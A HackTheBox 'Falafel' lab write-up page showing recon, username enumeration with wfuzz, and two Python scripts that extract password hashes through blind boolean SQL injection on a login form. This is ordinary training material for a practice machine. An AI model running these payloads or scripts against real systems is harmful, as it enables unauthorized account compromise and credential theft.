@@ -1,0 +1,1262 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>HackTheBox - Falafel Writeup w/o Metasploit - Welcome to noobsec</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="karan bhayani" />
+    
+
+    
+        <meta property="og:title" content="HackTheBox - Falafel Writeup w/o Metasploit" />
+<meta property="og:description" content="HackTheBox - Falafel Writeup w/o Metasploit Introduction Falafel is a retired HackTheBox machine and one of the most interesting machines I have hacked on the platform. It is a Linux machine with some really fun vulnerabilities to exploit. The machine is rated hard but the author was kind enough to give us hints as we hack through it. The machine requires you to know a range of nuances from SQLi to Linux filesystems." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/hackthebox/htb-falafel-writeup-w-o-metasploit/" /><meta property="article:section" content="hackthebox" />
+<meta property="article:published_time" content="2020-07-18T14:46:16+00:00" />
+<meta property="article:modified_time" content="2020-07-18T14:46:16+00:00" />
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HackTheBox - Falafel Writeup w/o Metasploit"/>
+<meta name="twitter:description" content="HackTheBox - Falafel Writeup w/o Metasploit Introduction Falafel is a retired HackTheBox machine and one of the most interesting machines I have hacked on the platform. It is a Linux machine with some really fun vulnerabilities to exploit. The machine is rated hard but the author was kind enough to give us hints as we hack through it. The machine requires you to know a range of nuances from SQLi to Linux filesystems."/>
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+        
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-171056200-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'light';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en-us.js" integrity=""></script>
+
+
+
+
+
+</head>
+<body>
+        <main><header>
+    <div class="brand">
+        <div id="sidebar_btn">
+            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+        </div>
+
+        <div>
+            <a href="/">noobsec</a>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">OSCP</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">OSCP AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-journey" class="pure-menu-link">OSCP Journey</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/bof" class="pure-menu-link">OSCP BOF</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">HTB</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bart" class="pure-menu-link">HTB Bart</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit" class="pure-menu-link">HTB Falafel</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-cronos" class="pure-menu-link">HTB Cronos</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bashed" class="pure-menu-link">HTB Bashed</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-lame" class="pure-menu-link">HTB Lame</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Web Attacks</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/file-inclusion" class="pure-menu-link">File Inclusion</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x01" class="pure-menu-link">SQLi 0x01</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x02" class="pure-menu-link">SQLi 0x02</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x03" class="pure-menu-link">SQLi 0x03</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Cheatsheets</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/crtp-cheatsheet" class="pure-menu-link">CRTP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/whoami/" class="pure-menu-link">About</a>
+                    
+                </li></ul>
+</nav>
+<div id="sidebar_canvas_overlay" class="hidden"></div>
+<div id="sidebar" class="close">
+    <ul><li>
+                    <details>
+                        <summary><a href="#">OSCP</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">HTB</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Web Attacks</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Cheatsheets</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <a href="/starting-point">Getting Started in Red Team</a>
+                </li><li>
+                    <a href="/whoami/">About</a>
+                </li></ul>
+</div><div id="content" class="content-margin">
+                
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#general-enumeration">General Enumeration</a></li>
+        <li><a href="#ssh-enumeration">SSH Enumeration</a></li>
+        <li><a href="#http-enumeration">HTTP Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#website-access">Website Access</a>
+      <ul>
+        <li><a href="#blind-boolean-sql-injection---extracting-passwords">Blind Boolean SQL Injection - Extracting Passwords</a></li>
+        <li><a href="#php-type-juggling---cracking-admins-hash">PHP Type Juggling - Cracking Admins&rsquo; Hash</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-access---exploiting-upload-functionality">Initial Access - Exploiting Upload Functionality</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#escalating-to-moshe">Escalating To Moshe</a></li>
+        <li><a href="#escalating-to-yossi">Escalating To Yossi</a></li>
+        <li><a href="#escalating-to-root">Escalating To Root</a></li>
+      </ul>
+    </li>
+    <li><a href="#getting-loot">Getting Loot</a></li>
+    <li><a href="#extra---vulnerability-analysis">Extra - Vulnerability Analysis</a>
+      <ul>
+        <li><a href="#sql-injection">SQL Injection</a></li>
+        <li><a href="#upload-page">Upload Page</a></li>
+      </ul>
+    </li>
+    <li><a href="#fin">Fin</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 id="hackthebox---falafel-writeup-wo-metasploit">HackTheBox - Falafel Writeup w/o Metasploit</h1>
+<h2 id="introduction">Introduction</h2>
+<p>Falafel is a retired HackTheBox machine and one of the most interesting machines I have hacked on the platform. It is a Linux machine with some really fun vulnerabilities to exploit. The machine is rated hard but the author was kind enough to give us hints as we hack through it. The machine requires you to know a range of nuances from SQLi to Linux filesystems. Let&rsquo;s jump right in.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/0.png" alt="Falafel"></p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="general-enumeration">General Enumeration</h3>
+<p>We&rsquo;ll start our reconnaissance with few nmap scans. Starting with the initial scan.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/1_nmap1.png" alt="Nmap Initial Scan"></p>
+<p>We see that we have two services on our hand: SSH and HTTP. Since SSH is present, you can fairly guess that it&rsquo;s a Linux machine. Let&rsquo;s perform our targeted scan on these two ports.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/1_nmap3.png" alt="Nmap Targeted Scan"></p>
+<p>From the SSH version information we can say that the OS is potentially Ubuntu Xenial 16.04 LTS. With the Apache server version our guess gets stronger. We get a custom title, which is nice but in the robots.txt it shows that the web server wanna hide some text files, so let&rsquo;s look for text files.</p>
+<h3 id="ssh-enumeration">SSH Enumeration</h3>
+<p>Another way we could have gotten the SSH verion:</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/2_ssh_enum.png" alt="SSH Manual Enumeration"></p>
+<p>We can see that there&rsquo;s no other information other than that.</p>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<p>Another way we could have gotten HTTP server version is using curl:</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/2_http_enum.png" alt="HTTP Manual Enumeration"></p>
+<p>In the first page itself it seems like we have some PHP files on our hand, which is nice.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/2_http_enum2.png" alt="PHP Files"></p>
+<p>Let&rsquo;s enumerate the web for text files using gobuster, which would look for directories too:</p>
+<pre  class="mc-prism hide language-text" ><code>gobuster dir -u 10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -o go_med_txt
+</code></pre>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/3_web_recon.png" alt="Gobuster Output"></p>
+<p>Nothing can catch my attention faster than &ldquo;cyberlaw.txt&rdquo;. As a side note, don&rsquo;t do crime.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/4_cyberlaw.png" alt="cyberlaw.txt"></p>
+<p>From the text file we get a lot of information. Turns out there are two users on this website admin and chris, and chris is able to login as admin without knowing admins&rsquo; credential (could be an SQLi) as well as gain access to the machine. There are a lot of mail addresses on this message, but apparently no mail service is found, could be something internal.</p>
+<h2 id="website-access">Website Access</h2>
+<h3 id="blind-boolean-sql-injection---extracting-passwords">Blind Boolean SQL Injection - Extracting Passwords</h3>
+<h4 id="identification">Identification</h4>
+<p>After going through application, <code>/login.php</code> was the only endpoint with which a user can interact, and with a database that too.</p>
+<p>Sending <code>admin : admin</code></p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login1.png" alt="Wrong Identification"></p>
+<p>Looks like we can do user enumeration.</p>
+<h5 id="user-enumeration">User Enumeration</h5>
+<p>Let&rsquo;s assume that we did not know that a user named chris existed, we could enumerate for users existed on this website using <code>wfuzz</code></p>
+<pre  class="mc-prism hide language-text" ><code>wfuzz -c -d &quot;username=FUZZ&amp;password=n00bsec&quot; -w /usr/share/seclists/Usernames/Names/names.txt -u http://10.10.10.73/login.php
+</code></pre>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_userenum1.png" alt="Wfuzz Check"></p>
+<p>Now that we know that wfuzz works, and we can guess that it&rsquo;s not possible for every user came consecuively from the wordlist is not possible, let&rsquo;s filter results as per number of characters - 7074</p>
+<pre  class="mc-prism hide language-text" ><code>wfuzz -c -d &quot;username=FUZZ&amp;password=n00bsec&quot; -w /usr/share/seclists/Usernames/Names/names.txt -u http://10.10.10.73/login.php --hh 7074
+</code></pre>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_userenum2.png" alt="User Enumeration"></p>
+<h4 id="testing">Testing</h4>
+<p>We&rsquo;ll start with testing now.</p>
+<p>Testing with a single-quote first. Sending <code>admin':admin</code></p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login2.png" alt="Try Again"></p>
+<p><em>Try again..</em> error.</p>
+<p>Let&rsquo;s test a single-quote and a comment. We&rsquo;ll comment out after the single-quote and see if that changes anything.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/5_login1.png" alt="Wrong Identification"></p>
+<p>We get <em>Wrong identification : admin</em> error again. With this we can say that we have an sql injection on our hand.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>Next step would be get the number of columns, but UNION is blocked regardless of what you do or try any kind of bypass. We could use ORDER BY to get the number of columns but clearly this is not an error-based SQL injection. Since we cannot use UNION, getting the number of columns does not make sense.</p>
+<p>Although we cannot dump credentials out on the screen, it does not mean we cannot extract data out.</p>
+<p>Since this is a SQL database, we could use <em>substring</em> - <code>substring(string, position, length)</code> function. As the name suggests, substring function takes a &ldquo;string&rdquo;, or a column (like in this case), along with position, and length, and prints out the characters of a string (or column) from the position and length you specify.</p>
+<p>Let&rsquo;s test it with the username field to get a gist, since we know that &ldquo;admin&rdquo; exist</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub1.png" alt="&ldquo;Right&rdquo; Error"></p>
+<p>It&rsquo;s important to keep in mind that when our SQL injection is working, we get the error &ldquo;Wrong identification&rdquo;, and when it does not, we get an error &ldquo;Try again&rdquo;.</p>
+<p>Similarly, we can extract the hashes of the users present in here.</p>
+<p>We&rsquo;ll test for [a-f0-9] (because hashes) for each character position for the password column, and if we get the error &ldquo;Wrong identification&rdquo;, then it would indicate that for position X the password column has that character.</p>
+<h5 id="hash-extraction---burpsuite-edition">Hash Extraction - BurpSuite Edition</h5>
+<p>This can be done in BurpSuite Intruder, even in Community Edition which is what I use, let&rsquo;s take a look at finding the first character of the admin&rsquo;s hash.</p>
+<p>First we select a login request in BurpSuite and &ldquo;Send it to intruder&rdquo; and set our payload position:</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp1.png" alt="Setting Payload Position"></p>
+<p>Next step to set a payload, we&rsquo;ll select Brute Forcer. Modify the character set, as below:</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp2.png" alt="Setting Payload"></p>
+<p>To make our life easier, we could put the &ldquo;right&rdquo; error string in the &ldquo;Grep Match&rdquo; section so that the request that matches as per our error will get marked.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp3.png" alt="Grepping Error"></p>
+<p>We&rsquo;re now ready to &ldquo;Start Attack&quot;ing. Once we do, we soon find that the first character of the admins&rsquo; hash is zero (0). We can now pause the attack since we already got what we needed from this injection.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/8_sub_burp4.png" alt="Getting The First Character"></p>
+<p>We were successfully able to leverage BurpSuite Intruder to extract the first character of admins&rsquo; hash and can see that it is &ldquo;0&rdquo; (Zero).</p>
+<h5 id="hash-extraction---python-edition">Hash Extraction - Python Edition</h5>
+<p><em>Note: Link to the scripts are at the bottom</em></p>
+<p>Although this is nice and we can perform a little more tweaking and get the entire hash, it would be a LOT faster if we whipped up a script of our own and got this done, which is what we will be doing now.</p>
+<p>I wrote a script in python to get the admin&rsquo;s hash.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># Importing necessary library
+import requests
+
+# This function generates SQL injection payload to fetch the hash, for each index (i) and character (c) passed to the function
+def SQLpayload(i,c):
+    return &quot;admin' AND substring(password,%s,1)='%s'-- -&quot; % (i,c)
+
+
+# All the characters in a hash
+characters = 'abcdef0123456789'
+
+password = '' # Blank password string
+
+# Loop through every index position : 1 to 32
+for i in range(1,33):
+# Loop through every character in the &quot;characters&quot; for each index position
+    for c in characters:
+    # Defining a payload to be sent to the server
+        payload = {'username':SQLpayload(i,c), 'password':'n00bsec'}
+        # Sending a post request with the above payload and it's data and response is saved in &quot;r&quot;
+        r = requests.post('http://10.10.10.73/login.php',data=payload)
+        # Checking if &quot;right&quot; error is hit at an index for a character
+        if &quot;Wrong identification&quot; in r.text:
+        # If right error is hit, add the character to the password string
+            password += c
+            # Print the character on the screen without adding a &quot;\n&quot; - newline
+            print(c,end='',flush=True)
+            # No need to cycle through the rest of the characters if the &quot;right&quot; error is already hit for an index position
+            break
+
+# Print the hash
+print('\nHash is:\t'+password+'\n')
+</code></pre>
+<p>Once we run the script we get the admin users&rsquo; hash.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto1.png" alt="Hash Extracted"></p>
+<p>Although this script works, it takes quite some time to run. So I created another script which would perform some extra queries to the database before it checks whether a character is in users&rsquo; hashs&rsquo; X position or not.</p>
+<p>The first check is to find if the character in X position is an alphabet or not. If so, it is checked if it belongs to [a-f] group or the rest. If it&rsquo;s a hash, it&rsquo;ll always belong to a-f group which is &ldquo;alpha1&rdquo; in the below code.
+If it&rsquo;s not an alphabet, it&rsquo;s checked if the number belongs to [0-4] group or [5-9].
+Once the group is sent back, SQLstring is used to generate payloads for characters in only those groups for X position. This reduces the amount of requests sent to the server, and we extract the hash much faster.</p>
+<p>These checks are done using &ldquo;ord&rdquo;. Ordinal numbers are just decimal numbers. We convert the output of the substring to ord and perform a check if it&rsquo;s greater than 58, ascii(9) = decimal(57), thus checking if the character in that position is an alphabet.</p>
+<table class="mc-table">
+<thead>
+<tr>
+<th>Numbers (dec hex ascii)</th>
+<th>Alphabets (dec hex ascii)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/13_ord1.png" alt=""></td>
+<td><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/13_ord2.png" alt=""></td>
+</tr>
+</tbody>
+</table>
+<p>Check out <code>man ascii</code> to view the entire table.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
+
+
+def SQLstring(i,c):
+    # We only want 1 password character at a time
+    # Final payload will look like (example 1st chars)
+    # username:admin' AND substring(password,1,1)='a'
+    return &quot;admin' AND substring(password,%s,1)='%s'-- -&quot; % (i,c)
+
+
+def SQLsplit(i):
+    # Checking if the character is an alphabet
+    sql = &quot;admin' AND ord(substring(password,%s,1)) &gt; '58'-- -&quot; % i
+    payload = {'username':sql, 'password':'abcd'}
+    r = requests.post('http://10.10.10.73/login.php', data=payload)
+    if &quot;Wrong identification&quot; in r.text:
+    # Checking if it's beyond &quot;f&quot;
+        sql = &quot;admin' AND ord(substring(password,%s,1)) &gt; '102'-- -&quot; % i
+        payload = {'username':sql, 'password':'abcd'}
+        r = requests.post('http://10.10.10.73/login.php', data=payload)
+        if &quot;Wrong identification&quot; in r.text:
+            return &quot;alpha2&quot;
+        else:
+        # If not beyond &quot;f&quot;
+            return &quot;alpha1&quot;
+    # Character is a number
+    else:
+    # Checking if number is less than &quot;5&quot;
+        sql = &quot;admin' AND ord(substring(password,%s,1)) &lt; '53'-- -&quot; % i
+        payload = {'username':sql, 'password':'abcd'}
+        r = requests.post('http://10.10.10.73/login.php', data=payload)
+        if &quot;Wrong identification&quot; in r.text:
+            return &quot;num1&quot;
+        else:
+        # If number is greater than 5
+            return &quot;num2&quot;
+
+
+# password could be in hashed format or plaintext
+alpha1 = 'abcdef'
+alpha2 = 'ghijklmnopqrstuvwxyz'
+num1 = '01234'
+num2 = '56789'
+
+# Password variable
+passwd = ''
+
+for i in range(1,33):
+    if SQLsplit(i) == &quot;alpha1&quot;:
+        for a in alpha1:
+            payload = {'username':SQLstring(i,a), 'password':'abcd'}
+            r = requests.post('http://10.10.10.73/login.php', data=payload)
+            if &quot;Wrong identification&quot; in r.text:
+                passwd += a
+                print(a,end='',flush=True)
+                break
+
+    elif SQLsplit(i) == &quot;alpha2&quot;:
+        for a in alpha2:
+            payload = {'username':SQLstring(i,a), 'password':'abcd'}
+            r = requests.post('http://10.10.10.73/login.php', data=payload)
+            if &quot;Wrong identification&quot; in r.text:
+                passwd += a
+                print(a,end='',flush=True)
+                break
+            
+    elif SQLsplit(i) == &quot;num1&quot;:
+        for n in num1:
+            payload = {'username':SQLstring(i,n), 'password':'abcd'}
+            r = requests.post('http://10.10.10.73/login.php', data=payload)
+            if &quot;Wrong identification&quot; in r.text:
+                passwd += n
+                print(n,end='',flush=True)
+                break
+
+    
+    else:
+        for n in num2:
+            payload = {'username':SQLstring(i,n), 'password':'abcd'}
+            r = requests.post('http://10.10.10.73/login.php',data=payload)
+            if &quot;Wrong identification&quot; in r.text:
+                passwd += n
+                print(n,end='',flush=True)
+                break
+
+
+# print('\n')
+print('\nPass or Hash is:\t'+passwd+'\n')
+</code></pre>
+<p>The above script is not perfect, maybe you could make it even more dynamic.</p>
+<p>Running this script to get the admins&rsquo; hash:</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto2.png" alt="Admins&rsquo; Hash Extracted"></p>
+<p>By making a script with extra checks, it helped us save 38 seconds for just one account, if there were a lot of accounts in here that would add up to some considerable amount of time saved.</p>
+<p>Made necessary changes and then fetched chris&rsquo; hash:</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/9_auto3.png" alt="Chris&rsquo; Hash Extracted"></p>
+<p>For the second user we were only able to save a meagre 2 seconds, but it&rsquo;s still something right? ¯\_(ツ)_/¯</p>
